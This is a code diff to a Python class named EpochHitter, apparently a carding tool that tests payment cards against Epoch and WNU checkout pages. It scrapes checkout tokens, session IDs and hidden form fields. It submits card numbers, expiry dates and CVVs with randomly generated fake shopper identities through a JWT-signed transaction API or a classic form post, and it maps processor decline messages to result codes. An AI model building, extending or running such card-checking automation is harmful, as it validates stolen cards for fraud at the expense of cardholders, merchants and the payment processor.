@@ -52,11 +52,16 @@ def _generate_random_shopper(country_code: str = 'US') -> dict:
     }
 
 class EpochHitter:
-    """Universal Epoch Billing & Payment Gateway Engine."""
+    """Epoch Billing & WNU Payment Gateway Engine."""
 
     DECLINE_MAP = {
         "declined": "card_declined",
+        "insufficient_funds": "insufficient_funds",
         "insufficient funds": "insufficient_funds",
+        "do not honor": "do_not_honor",
+        "do_not_honor": "do_not_honor",
+        "incorrect cvc": "incorrect_cvc",
+        "invalid cvc": "incorrect_cvc",
         "expired card": "expired_card",
         "invalid card": "invalid_number",
         "cvv declined": "incorrect_cvc",
@@ -80,7 +85,7 @@ class EpochHitter:
         return "https://billing.epoch.com"
 
     async def _scrape(self, session) -> dict:
-        """Scrapes Epoch checkout page for form target action & hidden parameter fields."""
+        """Scrapes Epoch / WNU checkout page for form target action & parameters."""
         hdr = {
             "User-Agent": UA,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -93,10 +98,19 @@ class EpochHitter:
             'currency': 'USD',
             'form_data': {},
             'is_epoch': False,
+            'token': None,
+            'cacheKey': None,
+            'sessionID': None,
         }
 
-        if any(domain in self.url.lower() for domain in ['epoch.com', 'epochbilling', 'billing.epoch']):
+        if any(domain in self.url.lower() for domain in ['epoch.com', 'epochbilling', 'billing.epoch', 'wnu.com']):
             cfg['is_epoch'] = True
+
+        parsed_q = parse_qs(urlparse(self.url).query)
+        if 'cacheKey' in parsed_q:
+            cfg['cacheKey'] = parsed_q['cacheKey'][0]
+        if 'sessionID' in parsed_q:
+            cfg['sessionID'] = parsed_q['sessionID'][0]
 
         async with session.get(self.url, headers=hdr, timeout=12) as res:
             html = res.text() if callable(res.text) else res.text
@@ -105,17 +119,31 @@ class EpochHitter:
             t = re.search(r'<title>([^<]+)</title>', html, re.I)
             if t:
                 title = t.group(1).strip()
-                if 'epoch' in title.lower() or 'billing' in title.lower():
+                if ('epoch' in title.lower() or 'billing' in title.lower() or 'wnu' in title.lower()) and len(title) > 2:
                     cfg['is_epoch'] = True
                     cfg['merchant'] = title[:30]
 
-            # Extract form action
+            # 1. Parse WNU / Epoch SPA State (window.__INITIAL_STATE__)
+            m_state = re.search(r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});', html, re.DOTALL)
+            if m_state:
+                try:
+                    clean_state = m_state.group(1).replace('undefined', 'null')
+                    state_data = json.loads(clean_state)
+                    cfg['token'] = state_data.get('token')
+                    cfg['cacheKey'] = state_data.get('queryParams', {}).get('cacheKey') or state_data.get('invoiceQuery', {}).get('cacheKey') or cfg['cacheKey']
+                    cfg['sessionID'] = state_data.get('sessionID') or state_data.get('queryParams', {}).get('sessionID') or cfg['sessionID']
+                    cfg['is_epoch'] = True
+                except Exception:
+                    pass
+
+            # 2. Extract HTML form action
             m_form = re.search(r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>', html, re.I)
             if m_form:
                 action_target = m_form.group(1)
                 cfg['action'] = urljoin(self.url, action_target)
+                cfg['is_epoch'] = True
 
-            # Extract hidden input fields
+            # 3. Extract hidden input fields
             inputs = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', html, re.I)
             for inp in inputs:
                 name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
@@ -127,9 +155,6 @@ class EpochHitter:
             for param in ['pi_code', 'reseller', 'co_code', 'member_idx', 'pi_idx', 'order_id', 'cachekey', 'sessionid', 'wnu.com', 'invoice']:
                 if param in html.lower() or param in self.url.lower():
                     cfg['is_epoch'] = True
-
-            if m_form:
-                cfg['is_epoch'] = True
 
             # Extract amount / price if visible
             amt_m = re.search(r'(?:USD|EUR|GBP|\$|£|€)\s*([\d\.]+)', html)
@@ -248,6 +273,57 @@ class EpochHitter:
                 yr = card['year'] if len(card['year']) == 4 else f"20{card['year']}"
                 yr_short = yr[-2:]
 
+                # 1. Modern WNU / Epoch v4 JWT API flow
+                if cfg.get('token') and (cfg.get('cacheKey') or 'wnu.com' in self.url.lower()):
+                    tx_payload = {
+                        "cacheKey": cfg.get('cacheKey') or parse_qs(urlparse(self.url).query).get('cacheKey', [''])[0],
+                        "sessionID": cfg.get('sessionID') or parse_qs(urlparse(self.url).query).get('sessionID', [''])[0],
+                        "card_number": card['card'],
+                        "card_number_1": card['card'],
+                        "cardNum": card['card'],
+                        "cardExpiration": f"{card['month'].zfill(2)}/{yr_short}",
+                        "expire_month": card['month'].zfill(2),
+                        "expire_year": yr_short,
+                        "cvv2": card['cvv'],
+                        "cvv": card['cvv'],
+                        "name_on_card": shopper['full_name'],
+                        "fullName": shopper['full_name'],
+                        "first_name": shopper['first_name'],
+                        "last_name": shopper['last_name'],
+                        "email": shopper['email'],
+                        "street": shopper['street'],
+                        "city": shopper['city'],
+                        "state": shopper['state'],
+                        "zip": shopper['postal_code'],
+                        "postalCode": shopper['postal_code'],
+                        "countryCode": shopper.get('country', 'US'),
+                        "country": shopper.get('country', 'US'),
+                        "currencyCode": cfg.get('currency', 'USD'),
+                        "productCode": cfg.get('product_id', '1'),
+                        "submitCount": 1,
+                        "paymentType": "CreditDebitCard",
+                        "redirectType": "CreditDebitCard"
+                    }
+                    jwt_token = _jwt_sign(tx_payload, cfg['token'])
+                    jwt_hdr = {
+                        "Authorization": f"Bearer {jwt_token}",
+                        "Content-Type": "application/json",
+                        "Accept": "application/json, text/plain, */*",
+                        "User-Agent": UA,
+                        "Origin": self._get_origin(),
+                        "Referer": self.url,
+                    }
+                    
+                    tx_url = urljoin(self.url, "/transaction")
+                    try:
+                        async with sess.post(tx_url, json=tx_payload, headers=jwt_hdr, timeout=15) as r_tx:
+                            tx_resp = r_tx.text() if callable(r_tx.text) else r_tx.text
+                            result['response_time'] = round(time.time() - t0, 2)
+                            return self._parse_response(tx_resp, r_tx.status_code, result)
+                    except Exception:
+                        pass
+
+                # 2. Classic Epoch Form POST flow
                 payload = {
                     **cfg['form_data'],
                     'card_number': card['card'],
@@ -281,46 +357,6 @@ class EpochHitter:
 
                 async with sess.post(target_action, data=urllib.parse.urlencode(payload), headers=hdr, timeout=15) as r:
                     html_resp = r.text() if callable(r.text) else r.text
-                    
-                    # If form submission returns 401 missing auth header, probe direct JSON API endpoints
-                    if r.status_code == 401 or 'authorization' in html_resp.lower():
-                        api_body = {
-                            "cardNumber": card['card'],
-                            "card": card['card'],
-                            "expirationMonth": card['month'].zfill(2),
-                            "expirationYear": yr_short,
-                            "cardCvc": card['cvv'],
-                            "cvv": card['cvv'],
-                            "billingAddress": {
-                                "firstName": shopper['first_name'],
-                                "lastName": shopper['last_name'],
-                                "email": shopper['email'],
-                                "address": shopper['street'],
-                                "city": shopper['city'],
-                                "state": shopper['state'],
-                                "zip": shopper['postal_code'],
-                                "country": shopper['country']
-                            }
-                        }
-                        json_hdr = {
-                            "Content-Type": "application/json",
-                            "Accept": "application/json",
-                            "User-Agent": UA,
-                            "Origin": self._get_origin(),
-                            "Referer": self.url,
-                        }
-                        api_endpoints = ['/api/v1/checkout/pay', '/api/pay', '/api/payment/submit', '/invoice/pay', '/api/checkout']
-                        for ep in api_endpoints:
-                            target_api = urljoin(self.url, ep)
-                            try:
-                                async with sess.post(target_api, json=api_body, headers=json_hdr, timeout=8) as r_api:
-                                    if r_api.status_code in (200, 201, 400, 422):
-                                        api_resp = r_api.text() if callable(r_api.text) else r_api.text
-                                        result['response_time'] = round(time.time() - t0, 2)
-                                        return self._parse_response(api_resp, r_api.status_code, result)
-                            except Exception:
-                                continue
-
                     result['response_time'] = round(time.time() - t0, 2)
                     return self._parse_response(html_resp, r.status_code, result)
 
